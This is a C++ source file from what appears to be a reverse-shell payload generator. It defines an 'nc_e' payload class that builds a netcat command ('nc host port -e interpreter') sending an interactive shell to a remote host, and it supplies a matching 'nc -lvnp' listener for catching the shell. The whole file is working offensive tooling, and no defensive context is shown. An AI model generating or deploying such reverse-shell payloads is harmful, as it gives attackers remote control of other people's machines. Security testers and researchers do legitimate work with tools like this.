#include "Nc_E_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcEPayload::name() const {
return "nc_e";
}

std::string NcEPayload::generate(const Options& opts) const {
    return "nc " + opts.host + " " + std::to_string(opts.port) + " -e " + opts.interpreter;
}

std::string NcEPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}